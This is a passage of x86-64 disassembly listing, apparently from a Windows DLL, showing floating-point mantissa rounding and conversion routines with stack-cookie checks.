   18000cdf5:	03 c2                	add    %edx,%eax
   18000cdf7:	44 8b c8             	mov    %eax,%r9d
   18000cdfa:	41 23 c4             	and    %r12d,%eax
   18000cdfd:	2b c2                	sub    %edx,%eax
   18000cdff:	41 c1 f9 05          	sar    $0x5,%r9d
   18000ce03:	44 2b d8             	sub    %eax,%r11d
   18000ce06:	49 63 c1             	movslq %r9d,%rax
   18000ce09:	8b 4c 85 e8          	mov    -0x18(%rbp,%rax,4),%ecx
   18000ce0d:	44 0f a3 d9          	bt     %r11d,%ecx
   18000ce11:	0f 83 98 00 00 00    	jae    0x18000ceaf
   18000ce17:	41 8b cb             	mov    %r11d,%ecx
   18000ce1a:	41 8b c7             	mov    %r15d,%eax
   18000ce1d:	49 63 d1             	movslq %r9d,%rdx
   18000ce20:	d3 e0                	shl    %cl,%eax
   18000ce22:	f7 d0                	not    %eax
   18000ce24:	85 44 95 e8          	test   %eax,-0x18(%rbp,%rdx,4)
   18000ce28:	75 19                	jne    0x18000ce43
   18000ce2a:	41 8d 41 01          	lea    0x1(%r9),%eax
   18000ce2e:	48 63 c8             	movslq %eax,%rcx
   18000ce31:	eb 09                	jmp    0x18000ce3c
   18000ce33:	39 5c 8d e8          	cmp    %ebx,-0x18(%rbp,%rcx,4)
   18000ce37:	75 0a                	jne    0x18000ce43
   18000ce39:	48 03 ce             	add    %rsi,%rcx
   18000ce3c:	49 3b ce             	cmp    %r14,%rcx
   18000ce3f:	7c f2                	jl     0x18000ce33
   18000ce41:	eb 6c                	jmp    0x18000ceaf
   18000ce43:	41 8b c0             	mov    %r8d,%eax
   18000ce46:	41 8b cc             	mov    %r12d,%ecx
   18000ce49:	99                   	cltd
   18000ce4a:	41 23 d4             	and    %r12d,%edx
   18000ce4d:	03 c2                	add    %edx,%eax
   18000ce4f:	44 8b d0             	mov    %eax,%r10d
   18000ce52:	41 23 c4             	and    %r12d,%eax
   18000ce55:	2b c2                	sub    %edx,%eax
   18000ce57:	41 c1 fa 05          	sar    $0x5,%r10d
   18000ce5b:	8b d6                	mov    %esi,%edx
   18000ce5d:	2b c8                	sub    %eax,%ecx
   18000ce5f:	4d 63 ea             	movslq %r10d,%r13
   18000ce62:	42 8b 44 ad e8       	mov    -0x18(%rbp,%r13,4),%eax
   18000ce67:	d3 e2                	shl    %cl,%edx
   18000ce69:	8b cb                	mov    %ebx,%ecx
   18000ce6b:	44 8d 04 10          	lea    (%rax,%rdx,1),%r8d
   18000ce6f:	44 3b c0             	cmp    %eax,%r8d
   18000ce72:	72 05                	jb     0x18000ce79
   18000ce74:	44 3b c2             	cmp    %edx,%r8d
   18000ce77:	73 02                	jae    0x18000ce7b
   18000ce79:	8b ce                	mov    %esi,%ecx
   18000ce7b:	41 8d 42 ff          	lea    -0x1(%r10),%eax
   18000ce7f:	46 89 44 ad e8       	mov    %r8d,-0x18(%rbp,%r13,4)
   18000ce84:	48 63 d0             	movslq %eax,%rdx
   18000ce87:	85 c0                	test   %eax,%eax
   18000ce89:	78 24                	js     0x18000ceaf
   18000ce8b:	85 c9                	test   %ecx,%ecx
   18000ce8d:	74 20                	je     0x18000ceaf
   18000ce8f:	8b 44 95 e8          	mov    -0x18(%rbp,%rdx,4),%eax
   18000ce93:	8b cb                	mov    %ebx,%ecx
   18000ce95:	44 8d 40 01          	lea    0x1(%rax),%r8d
   18000ce99:	44 3b c0             	cmp    %eax,%r8d
   18000ce9c:	72 05                	jb     0x18000cea3
   18000ce9e:	44 3b c6             	cmp    %esi,%r8d
   18000cea1:	73 02                	jae    0x18000cea5
   18000cea3:	8b ce                	mov    %esi,%ecx
   18000cea5:	44 89 44 95 e8       	mov    %r8d,-0x18(%rbp,%rdx,4)
   18000ceaa:	48 2b d6             	sub    %rsi,%rdx
   18000cead:	79 dc                	jns    0x18000ce8b
   18000ceaf:	41 8b cb             	mov    %r11d,%ecx
   18000ceb2:	41 8b c7             	mov    %r15d,%eax
   18000ceb5:	d3 e0                	shl    %cl,%eax
   18000ceb7:	49 63 c9             	movslq %r9d,%rcx
   18000ceba:	21 44 8d e8          	and    %eax,-0x18(%rbp,%rcx,4)
   18000cebe:	41 8d 41 01          	lea    0x1(%r9),%eax
   18000cec2:	48 63 d0             	movslq %eax,%rdx
   18000cec5:	49 3b d6             	cmp    %r14,%rdx
   18000cec8:	7d 19                	jge    0x18000cee3
   18000ceca:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   18000cece:	4d 8b c6             	mov    %r14,%r8
   18000ced1:	4c 2b c2             	sub    %rdx,%r8
   18000ced4:	48 8d 0c 91          	lea    (%rcx,%rdx,4),%rcx
   18000ced8:	33 d2                	xor    %edx,%edx
   18000ceda:	49 c1 e0 02          	shl    $0x2,%r8
   18000cede:	e8 7d 83 ff ff       	call   0x180005260
   18000cee3:	8b 05 b3 d5 00 00    	mov    0xd5b3(%rip),%eax        # 0x18001a49c
   18000cee9:	41 bd 20 00 00 00    	mov    $0x20,%r13d
   18000ceef:	44 8b cb             	mov    %ebx,%r9d
   18000cef2:	ff c0                	inc    %eax
   18000cef4:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   18000cef8:	99                   	cltd
   18000cef9:	41 23 d4             	and    %r12d,%edx
   18000cefc:	03 c2                	add    %edx,%eax
   18000cefe:	44 8b d0             	mov    %eax,%r10d
   18000cf01:	41 23 c4             	and    %r12d,%eax
   18000cf04:	2b c2                	sub    %edx,%eax
   18000cf06:	41 c1 fa 05          	sar    $0x5,%r10d
   18000cf0a:	8b c8                	mov    %eax,%ecx
   18000cf0c:	44 8b d8             	mov    %eax,%r11d
   18000cf0f:	41 d3 e7             	shl    %cl,%r15d
   18000cf12:	44 2b e8             	sub    %eax,%r13d
   18000cf15:	41 f7 d7             	not    %r15d
   18000cf18:	41 8b 00             	mov    (%r8),%eax
   18000cf1b:	41 8b cb             	mov    %r11d,%ecx
   18000cf1e:	8b d0                	mov    %eax,%edx
   18000cf20:	d3 e8                	shr    %cl,%eax
   18000cf22:	41 8b cd             	mov    %r13d,%ecx
   18000cf25:	41 0b c1             	or     %r9d,%eax
   18000cf28:	41 23 d7             	and    %r15d,%edx
   18000cf2b:	44 8b ca             	mov    %edx,%r9d
   18000cf2e:	41 89 00             	mov    %eax,(%r8)
   18000cf31:	4d 8d 40 04          	lea    0x4(%r8),%r8
   18000cf35:	41 d3 e1             	shl    %cl,%r9d
   18000cf38:	4c 2b f6             	sub    %rsi,%r14
   18000cf3b:	75 db                	jne    0x18000cf18
   18000cf3d:	4d 63 d2             	movslq %r10d,%r10
   18000cf40:	4c 8b c7             	mov    %rdi,%r8
   18000cf43:	4d 8b ca             	mov    %r10,%r9
   18000cf46:	49 f7 d9             	neg    %r9
   18000cf49:	4d 3b c2             	cmp    %r10,%r8
   18000cf4c:	7c 15                	jl     0x18000cf63
   18000cf4e:	49 8b d0             	mov    %r8,%rdx
   18000cf51:	48 c1 e2 02          	shl    $0x2,%rdx
   18000cf55:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   18000cf59:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   18000cf5d:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   18000cf61:	eb 05                	jmp    0x18000cf68
   18000cf63:	42 89 5c 85 e8       	mov    %ebx,-0x18(%rbp,%r8,4)
   18000cf68:	4c 2b c6             	sub    %rsi,%r8
   18000cf6b:	79 dc                	jns    0x18000cf49
   18000cf6d:	44 8b c3             	mov    %ebx,%r8d
   18000cf70:	8b df                	mov    %edi,%ebx
   18000cf72:	e9 1b 01 00 00       	jmp    0x18000d092
   18000cf77:	8b 05 1f d5 00 00    	mov    0xd51f(%rip),%eax        # 0x18001a49c
   18000cf7d:	44 8b 15 0c d5 00 00 	mov    0xd50c(%rip),%r10d        # 0x18001a490
   18000cf84:	41 bd 20 00 00 00    	mov    $0x20,%r13d
   18000cf8a:	99                   	cltd
   18000cf8b:	41 23 d4             	and    %r12d,%edx
   18000cf8e:	03 c2                	add    %edx,%eax
   18000cf90:	44 8b d8             	mov    %eax,%r11d
   18000cf93:	41 23 c4             	and    %r12d,%eax
   18000cf96:	2b c2                	sub    %edx,%eax
   18000cf98:	41 c1 fb 05          	sar    $0x5,%r11d
   18000cf9c:	8b c8                	mov    %eax,%ecx
   18000cf9e:	41 d3 e7             	shl    %cl,%r15d
   18000cfa1:	41 f7 d7             	not    %r15d
   18000cfa4:	41 3b fa             	cmp    %r10d,%edi
   18000cfa7:	7c 7a                	jl     0x18000d023
   18000cfa9:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   18000cfad:	0f ba 6d e8 1f       	btsl   $0x1f,-0x18(%rbp)
   18000cfb2:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   18000cfb5:	44 2b e8             	sub    %eax,%r13d
   18000cfb8:	8b f8                	mov    %eax,%edi
   18000cfba:	44 8b cb             	mov    %ebx,%r9d
   18000cfbd:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   18000cfc1:	41 8b 00             	mov    (%r8),%eax
   18000cfc4:	8b cf                	mov    %edi,%ecx
   18000cfc6:	41 8b d7             	mov    %r15d,%edx
   18000cfc9:	23 d0                	and    %eax,%edx
   18000cfcb:	d3 e8                	shr    %cl,%eax
   18000cfcd:	41 8b cd             	mov    %r13d,%ecx
   18000cfd0:	41 0b c1             	or     %r9d,%eax
   18000cfd3:	44 8b ca             	mov    %edx,%r9d
   18000cfd6:	41 d3 e1             	shl    %cl,%r9d
   18000cfd9:	41 89 00             	mov    %eax,(%r8)
   18000cfdc:	4d 8d 40 04          	lea    0x4(%r8),%r8
   18000cfe0:	4c 2b f6             	sub    %rsi,%r14
   18000cfe3:	75 dc                	jne    0x18000cfc1
   18000cfe5:	4d 63 cb             	movslq %r11d,%r9
   18000cfe8:	41 8d 7e 02          	lea    0x2(%r14),%edi
   18000cfec:	4d 8b c1             	mov    %r9,%r8
   18000cfef:	49 f7 d8             	neg    %r8
   18000cff2:	49 3b f9             	cmp    %r9,%rdi
   18000cff5:	7c 15                	jl     0x18000d00c
   18000cff7:	48 8b d7             	mov    %rdi,%rdx
   18000cffa:	48 c1 e2 02          	shl    $0x2,%rdx
   18000cffe:	4a 8d 04 82          	lea    (%rdx,%r8,4),%rax
   18000d002:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   18000d006:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   18000d00a:	eb 04                	jmp    0x18000d010
   18000d00c:	89 5c bd e8          	mov    %ebx,-0x18(%rbp,%rdi,4)
   18000d010:	48 2b fe             	sub    %rsi,%rdi
   18000d013:	79 dd                	jns    0x18000cff2
   18000d015:	44 8b 05 88 d4 00 00 	mov    0xd488(%rip),%r8d        # 0x18001a4a4
   18000d01c:	8b de                	mov    %esi,%ebx
   18000d01e:	45 03 c2             	add    %r10d,%r8d
   18000d021:	eb 6f                	jmp    0x18000d092
   18000d023:	44 8b 05 7a d4 00 00 	mov    0xd47a(%rip),%r8d        # 0x18001a4a4
   18000d02a:	0f ba 75 e8 1f       	btrl   $0x1f,-0x18(%rbp)
   18000d02f:	44 8b d3             	mov    %ebx,%r10d
   18000d032:	44 03 c7             	add    %edi,%r8d
   18000d035:	8b f8                	mov    %eax,%edi
   18000d037:	44 2b e8             	sub    %eax,%r13d
   18000d03a:	4c 8d 4d e8          	lea    -0x18(%rbp),%r9
   18000d03e:	41 8b 01             	mov    (%r9),%eax
   18000d041:	8b cf                	mov    %edi,%ecx
   18000d043:	8b d0                	mov    %eax,%edx
   18000d045:	d3 e8                	shr    %cl,%eax
   18000d047:	41 8b cd             	mov    %r13d,%ecx
   18000d04a:	41 0b c2             	or     %r10d,%eax
   18000d04d:	41 23 d7             	and    %r15d,%edx
   18000d050:	44 8b d2             	mov    %edx,%r10d
   18000d053:	41 89 01             	mov    %eax,(%r9)
   18000d056:	4d 8d 49 04          	lea    0x4(%r9),%r9
   18000d05a:	41 d3 e2             	shl    %cl,%r10d
   18000d05d:	4c 2b f6             	sub    %rsi,%r14
   18000d060:	75 dc                	jne    0x18000d03e
   18000d062:	4d 63 d3             	movslq %r11d,%r10
   18000d065:	41 8d 7e 02          	lea    0x2(%r14),%edi
   18000d069:	4d 8b ca             	mov    %r10,%r9
   18000d06c:	49 f7 d9             	neg    %r9
   18000d06f:	49 3b fa             	cmp    %r10,%rdi
   18000d072:	7c 15                	jl     0x18000d089
   18000d074:	48 8b d7             	mov    %rdi,%rdx
   18000d077:	48 c1 e2 02          	shl    $0x2,%rdx
   18000d07b:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   18000d07f:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   18000d083:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   18000d087:	eb 04                	jmp    0x18000d08d
   18000d089:	89 5c bd e8          	mov    %ebx,-0x18(%rbp,%rdi,4)
   18000d08d:	48 2b fe             	sub    %rsi,%rdi
   18000d090:	79 dd                	jns    0x18000d06f
   18000d092:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
   18000d096:	44 2b 25 ff d3 00 00 	sub    0xd3ff(%rip),%r12d        # 0x18001a49c
   18000d09d:	41 8a cc             	mov    %r12b,%cl
   18000d0a0:	41 d3 e0             	shl    %cl,%r8d
   18000d0a3:	f7 5d c4             	negl   -0x3c(%rbp)
   18000d0a6:	1b c0                	sbb    %eax,%eax
   18000d0a8:	25 00 00 00 80       	and    $0x80000000,%eax
   18000d0ad:	44 0b c0             	or     %eax,%r8d
   18000d0b0:	8b 05 ea d3 00 00    	mov    0xd3ea(%rip),%eax        # 0x18001a4a0
   18000d0b6:	44 0b 45 e8          	or     -0x18(%rbp),%r8d
   18000d0ba:	83 f8 40             	cmp    $0x40,%eax
   18000d0bd:	75 0b                	jne    0x18000d0ca
   18000d0bf:	8b 45 ec             	mov    -0x14(%rbp),%eax
   18000d0c2:	44 89 42 04          	mov    %r8d,0x4(%rdx)
   18000d0c6:	89 02                	mov    %eax,(%rdx)
   18000d0c8:	eb 08                	jmp    0x18000d0d2
   18000d0ca:	83 f8 20             	cmp    $0x20,%eax
   18000d0cd:	75 03                	jne    0x18000d0d2
   18000d0cf:	44 89 02             	mov    %r8d,(%rdx)
   18000d0d2:	8b c3                	mov    %ebx,%eax
   18000d0d4:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   18000d0d8:	48 33 cc             	xor    %rsp,%rcx
   18000d0db:	e8 50 81 ff ff       	call   0x180005230
   18000d0e0:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   18000d0e5:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   18000d0e9:	49 8b 73 40          	mov    0x40(%r11),%rsi
   18000d0ed:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   18000d0f1:	49 8b e3             	mov    %r11,%rsp
   18000d0f4:	41 5f                	pop    %r15
   18000d0f6:	41 5e                	pop    %r14
   18000d0f8:	41 5d                	pop    %r13
   18000d0fa:	41 5c                	pop    %r12
   18000d0fc:	5d                   	pop    %rbp
   18000d0fd:	c3                   	ret
   18000d0fe:	cc                   	int3
   18000d0ff:	cc                   	int3
   18000d100:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000d105:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000d10a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000d10f:	55                   	push   %rbp
   18000d110:	41 54                	push   %r12
   18000d112:	41 55                	push   %r13
   18000d114:	41 56                	push   %r14
   18000d116:	41 57                	push   %r15
   18000d118:	48 8b ec             	mov    %rsp,%rbp
   18000d11b:	48 83 ec 60          	sub    $0x60,%rsp
   18000d11f:	48 8b 05 da be 00 00 	mov    0xbeda(%rip),%rax        # 0x180019000
   18000d126:	48 33 c4             	xor    %rsp,%rax
   18000d129:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   18000d12d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   18000d131:	44 0f b7 09          	movzwl (%rcx),%r9d
   18000d135:	33 db                	xor    %ebx,%ebx
   18000d137:	8b f8                	mov    %eax,%edi
   18000d139:	25 00 80 00 00       	and    $0x8000,%eax
   18000d13e:	41 c1 e1 10          	shl    $0x10,%r9d
   18000d142:	89 45 c4             	mov    %eax,-0x3c(%rbp)
   18000d145:	8b 41 06             	mov    0x6(%rcx),%eax
   18000d148:	81 e7 ff 7f 00 00    	and    $0x7fff,%edi
   18000d14e:	89 45 e8             	mov    %eax,-0x18(%rbp)
   18000d151:	8b 41 02             	mov    0x2(%rcx),%eax
   18000d154:	81 ef ff 3f 00 00    	sub    $0x3fff,%edi
   18000d15a:	41 bc 1f 00 00 00    	mov    $0x1f,%r12d
   18000d160:	48 89 55 d0          	mov    %rdx,-0x30(%rbp)
   18000d164:	44 89 4d d8          	mov    %r9d,-0x28(%rbp)
   18000d168:	89 45 ec             	mov    %eax,-0x14(%rbp)
   18000d16b:	44 89 4d f0          	mov    %r9d,-0x10(%rbp)
   18000d16f:	8d 73 01             	lea    0x1(%rbx),%esi
   18000d172:	45 8d 74 24 e4       	lea    -0x1c(%r12),%r14d
   18000d177:	81 ff 01 c0 ff ff    	cmp    $0xffffc001,%edi
   18000d17d:	75 29                	jne    0x18000d1a8
   18000d17f:	44 8b c3             	mov    %ebx,%r8d
   18000d182:	8b c3                	mov    %ebx,%eax
   18000d184:	39 5c 85 e8          	cmp    %ebx,-0x18(%rbp,%rax,4)
   18000d188:	75 0d                	jne    0x18000d197
   18000d18a:	48 03 c6             	add    %rsi,%rax
   18000d18d:	49 3b c6             	cmp    %r14,%rax
   18000d190:	7c f2                	jl     0x18000d184
   18000d192:	e9 b7 04 00 00       	jmp    0x18000d64e
   18000d197:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   18000d19b:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   18000d19e:	bb 02 00 00 00       	mov    $0x2,%ebx
   18000d1a3:	e9 a6 04 00 00       	jmp    0x18000d64e
   18000d1a8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   18000d1ac:	45 8b c4             	mov    %r12d,%r8d
   18000d1af:	41 83 cf ff          	or     $0xffffffff,%r15d
   18000d1b3:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   18000d1b7:	8b 05 f3 d2 00 00    	mov    0xd2f3(%rip),%eax        # 0x18001a4b0
   18000d1bd:	89 7d c0             	mov    %edi,-0x40(%rbp)
   18000d1c0:	ff c8                	dec    %eax
   18000d1c2:	44 8b eb             	mov    %ebx,%r13d
   18000d1c5:	89 45 c8             	mov    %eax,-0x38(%rbp)
   18000d1c8:	ff c0                	inc    %eax
   18000d1ca:	99                   	cltd
   18000d1cb:	41 23 d4             	and    %r12d,%edx
   18000d1ce:	03 c2                	add    %edx,%eax
   18000d1d0:	44 8b d0             	mov    %eax,%r10d
   18000d1d3:	41 23 c4             	and    %r12d,%eax
   18000d1d6:	41 c1 fa 05          	sar    $0x5,%r10d
   18000d1da:	2b c2                	sub    %edx,%eax
   18000d1dc:	44 2b c0             	sub    %eax,%r8d
   18000d1df:	4d 63 da             	movslq %r10d,%r11
   18000d1e2:	42 8b 4c 9d e8       	mov    -0x18(%rbp,%r11,4),%ecx
   18000d1e7:	44 89 45 dc          	mov    %r8d,-0x24(%rbp)
   18000d1eb:	44 0f a3 c1          	bt     %r8d,%ecx
   18000d1ef:	0f 83 9e 00 00 00    	jae    0x18000d293
   18000d1f5:	41 8b c8             	mov    %r8d,%ecx
   18000d1f8:	41 8b c7             	mov    %r15d,%eax
   18000d1fb:	49 63 d2             	movslq %r10d,%rdx
   18000d1fe:	d3 e0                	shl    %cl,%eax
   18000d200:	f7 d0                	not    %eax
   18000d202:	85 44 95 e8          	test   %eax,-0x18(%rbp,%rdx,4)
   18000d206:	75 19                	jne    0x18000d221
   18000d208:	41 8d 42 01          	lea    0x1(%r10),%eax
   18000d20c:	48 63 c8             	movslq %eax,%rcx
   18000d20f:	eb 09                	jmp    0x18000d21a
   18000d211:	39 5c 8d e8          	cmp    %ebx,-0x18(%rbp,%rcx,4)
   18000d215:	75 0a                	jne    0x18000d221
   18000d217:	48 03 ce             	add    %rsi,%rcx
   18000d21a:	49 3b ce             	cmp    %r14,%rcx
   18000d21d:	7c f2                	jl     0x18000d211
   18000d21f:	eb 72                	jmp    0x18000d293
   18000d221:	8b 45 c8             	mov    -0x38(%rbp),%eax
   18000d224:	41 8b cc             	mov    %r12d,%ecx
   18000d227:	99                   	cltd
   18000d228:	41 23 d4             	and    %r12d,%edx
   18000d22b:	03 c2                	add    %edx,%eax
   18000d22d:	44 8b c0             	mov    %eax,%r8d
   18000d230:	41 23 c4             	and    %r12d,%eax
   18000d233:	2b c2                	sub    %edx,%eax
   18000d235:	41 c1 f8 05          	sar    $0x5,%r8d
   18000d239:	8b d6                	mov    %esi,%edx
   18000d23b:	2b c8                	sub    %eax,%ecx
   18000d23d:	4d 63 d8             	movslq %r8d,%r11
   18000d240:	42 8b 44 9d e8       	mov    -0x18(%rbp,%r11,4),%eax
   18000d245:	d3 e2                	shl    %cl,%edx
   18000d247:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   18000d24a:	3b c8                	cmp    %eax,%ecx
   18000d24c:	72 04                	jb     0x18000d252
   18000d24e:	3b ca                	cmp    %edx,%ecx
   18000d250:	73 03                	jae    0x18000d255
   18000d252:	44 8b ee             	mov    %esi,%r13d
   18000d255:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   18000d259:	42 89 4c 9d e8       	mov    %ecx,-0x18(%rbp,%r11,4)
   18000d25e:	48 63 d0             	movslq %eax,%rdx
   18000d261:	85 c0                	test   %eax,%eax
   18000d263:	78 27                	js     0x18000d28c
   18000d265:	45 85 ed             	test   %r13d,%r13d
   18000d268:	74 22                	je     0x18000d28c
   18000d26a:	8b 44 95 e8          	mov    -0x18(%rbp,%rdx,4),%eax
   18000d26e:	44 8b eb             	mov    %ebx,%r13d
   18000d271:	44 8d 40 01          	lea    0x1(%rax),%r8d
   18000d275:	44 3b c0             	cmp    %eax,%r8d
   18000d278:	72 05                	jb     0x18000d27f
   18000d27a:	44 3b c6             	cmp    %esi,%r8d
   18000d27d:	73 03                	jae    0x18000d282
   18000d27f:	44 8b ee             	mov    %esi,%r13d
   18000d282:	44 89 44 95 e8       	mov    %r8d,-0x18(%rbp,%rdx,4)
   18000d287:	48 2b d6             	sub    %rsi,%rdx
   18000d28a:	79 d9                	jns    0x18000d265
   18000d28c:	44 8b 45 dc          	mov    -0x24(%rbp),%r8d
   18000d290:	4d 63 da             	movslq %r10d,%r11
   18000d293:	41 8b c8             	mov    %r8d,%ecx
   18000d296:	41 8b c7             	mov    %r15d,%eax
   18000d299:	d3 e0                	shl    %cl,%eax
   18000d29b:	42 21 44 9d e8       	and    %eax,-0x18(%rbp,%r11,4)
   18000d2a0:	41 8d 42 01          	lea    0x1(%r10),%eax
   18000d2a4:	48 63 d0             	movslq %eax,%rdx
   18000d2a7:	49 3b d6             	cmp    %r14,%rdx
   18000d2aa:	7d 1d                	jge    0x18000d2c9
   18000d2ac:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   18000d2b0:	4d 8b c6             	mov    %r14,%r8
   18000d2b3:	4c 2b c2             	sub    %rdx,%r8
   18000d2b6:	48 8d 0c 91          	lea    (%rcx,%rdx,4),%rcx
   18000d2ba:	33 d2                	xor    %edx,%edx
   18000d2bc:	49 c1 e0 02          	shl    $0x2,%r8
   18000d2c0:	e8 9b 7f ff ff       	call   0x180005260
   18000d2c5:	44 8b 4d d8          	mov    -0x28(%rbp),%r9d
   18000d2c9:	45 85 ed             	test   %r13d,%r13d
   18000d2cc:	74 02                	je     0x18000d2d0
   18000d2ce:	03 fe                	add    %esi,%edi
   18000d2d0:	8b 0d d6 d1 00 00    	mov    0xd1d6(%rip),%ecx        # 0x18001a4ac
   18000d2d6:	8b c1                	mov    %ecx,%eax
   18000d2d8:	2b 05 d2 d1 00 00    	sub    0xd1d2(%rip),%eax        # 0x18001a4b0
   18000d2de:	3b f8                	cmp    %eax,%edi
   18000d2e0:	7d 14                	jge    0x18000d2f6
   18000d2e2:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   18000d2e6:	89 5d f0             	mov    %ebx,-0x10(%rbp)
   18000d2e9:	44 8b c3             	mov    %ebx,%r8d
   18000d2ec:	bb 02 00 00 00       	mov    $0x2,%ebx
   18000d2f1:	e9 54 03 00 00       	jmp    0x18000d64a
   18000d2f6:	3b f9                	cmp    %ecx,%edi
   18000d2f8:	0f 8f 31 02 00 00    	jg     0x18000d52f
   18000d2fe:	2b 4d c0             	sub    -0x40(%rbp),%ecx
   18000d301:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   18000d305:	45 8b d7             	mov    %r15d,%r10d
   18000d308:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   18000d30c:	8b c1                	mov    %ecx,%eax
   18000d30e:	44 89 4d f0          	mov    %r9d,-0x10(%rbp)
   18000d312:	99                   	cltd
   18000d313:	4d 8b de             	mov    %r14,%r11
   18000d316:	44 8b cb             	mov    %ebx,%r9d
   18000d319:	41 23 d4             	and    %r12d,%edx
   18000d31c:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   18000d320:	03 c2                	add    %edx,%eax
   18000d322:	44 8b e8             	mov    %eax,%r13d
   18000d325:	41 23 c4             	and    %r12d,%eax
   18000d328:	2b c2                	sub    %edx,%eax
   18000d32a:	41 c1 fd 05          	sar    $0x5,%r13d
   18000d32e:	8b c8                	mov    %eax,%ecx
   18000d330:	8b f8                	mov    %eax,%edi
   18000d332:	b8 20 00 00 00       	mov    $0x20,%eax
   18000d337:	41 d3 e2             	shl    %cl,%r10d
   18000d33a:	2b c1                	sub    %ecx,%eax
   18000d33c:	44 8b f0             	mov    %eax,%r14d
   18000d33f:	41 f7 d2             	not    %r10d
   18000d342:	41 8b 00             	mov    (%r8),%eax
   18000d345:	8b cf                	mov    %edi,%ecx
   18000d347:	8b d0                	mov    %eax,%edx
   18000d349:	d3 e8                	shr    %cl,%eax
   18000d34b:	41 8b ce             	mov    %r14d,%ecx
   18000d34e:	41 0b c1             	or     %r9d,%eax
   18000d351:	41 23 d2             	and    %r10d,%edx
   18000d354:	44 8b ca             	mov    %edx,%r9d
   18000d357:	41 89 00             	mov    %eax,(%r8)
   18000d35a:	4d 8d 40 04          	lea    0x4(%r8),%r8
   18000d35e:	41 d3 e1             	shl    %cl,%r9d
   18000d361:	4c 2b de             	sub    %rsi,%r11
   18000d364:	75 dc                	jne    0x18000d342
   18000d366:	4d 63 d5             	movslq %r13d,%r10
   18000d369:	41 8d 7b 02          	lea    0x2(%r11),%edi
   18000d36d:	45 8d 73 03          	lea    0x3(%r11),%r14d
   18000d371:	4d 8b ca             	mov    %r10,%r9
   18000d374:	44 8b c7             	mov    %edi,%r8d
   18000d377:	49 f7 d9             	neg    %r9
   18000d37a:	4d 3b c2             	cmp    %r10,%r8
   18000d37d:	7c 15                	jl     0x18000d394
   18000d37f:	49 8b d0             	mov    %r8,%rdx
   18000d382:	48 c1 e2 02          	shl    $0x2,%rdx
   18000d386:	4a 8d 04 8a          	lea    (%rdx,%r9,4),%rax
   18000d38a:	8b 4c 05 e8          	mov    -0x18(%rbp,%rax,1),%ecx
   18000d38e:	89 4c 15 e8          	mov    %ecx,-0x18(%rbp,%rdx,1)
   18000d392:	eb 05                	jmp    0x18000d399
   18000d394:	42 89 5c 85 e8       	mov    %ebx,-0x18(%rbp,%r8,4)
   18000d399:	4c 2b c6             	sub    %rsi,%r8
   18000d39c:	79 dc                	jns    0x18000d37a
   18000d39e:	44 8b 45 c8          	mov    -0x38(%rbp),%r8d
   18000d3a2:	45 8b dc             	mov    %r12d,%r11d
   18000d3a5:	41 8d 40 01          	lea    0x1(%r8),%eax
   18000d3a9:	99                   	cltd
   18000d3aa:	41 23 d4             	and    %r12d,%edx
   18000d3ad:	03 c2                	add    %edx,%eax
   18000d3af:	44 8b c8             	mov    %eax,%r9d
   18000d3b2:	41 23 c4             	and    %r12d,%eax
   18000d3b5:	2b c2                	sub    %edx,%eax
   18000d3b7:	41 c1 f9 05          	sar    $0x5,%r9d
   18000d3bb:	44 2b d8             	sub    %eax,%r11d
   18000d3be:	49 63 c1             	movslq %r9d,%rax
   18000d3c1:	8b 4c 85 e8          	mov    -0x18(%rbp,%rax,4),%ecx
   18000d3c5:	44 0f a3 d9          	bt     %r11d,%ecx
   18000d3c9:	0f 83 98 00 00 00    	jae    0x18000d467
   18000d3cf:	41 8b cb             	mov    %r11d,%ecx
   18000d3d2:	41 8b c7             	mov    %r15d,%eax
   18000d3d5:	49 63 d1             	movslq %r9d,%rdx
   18000d3d8:	d3 e0                	shl    %cl,%eax
   18000d3da:	f7 d0                	not    %eax
   18000d3dc:	85 44 95 e8          	test   %eax,-0x18(%rbp,%rdx,4)
   18000d3e0:	75 19                	jne    0x18000d3fb
   18000d3e2:	41 8d 41 01          	lea    0x1(%r9),%eax
   18000d3e6:	48 63 c8             	movslq %eax,%rcx
   18000d3e9:	eb 09                	jmp    0x18000d3f4
   18000d3eb:	39 5c 8d e8          	cmp    %ebx,-0x18(%rbp,%rcx,4)
   18000d3ef:	75 0a                	jne    0x18000d3fb
   18000d3f1:	48 03 ce             	add    %rsi,%rcx
   18000d3f4:	49 3b ce             	cmp    %r14,%rcx
   18000d3f7:	7c f2                	jl     0x18000d3eb
   18000d3f9:	eb 6c                	jmp    0x18000d467
   18000d3fb:	41 8b c0             	mov    %r8d,%eax
   18000d3fe:	41 8b cc             	mov    %r12d,%ecx
   18000d401:	99                   	cltd
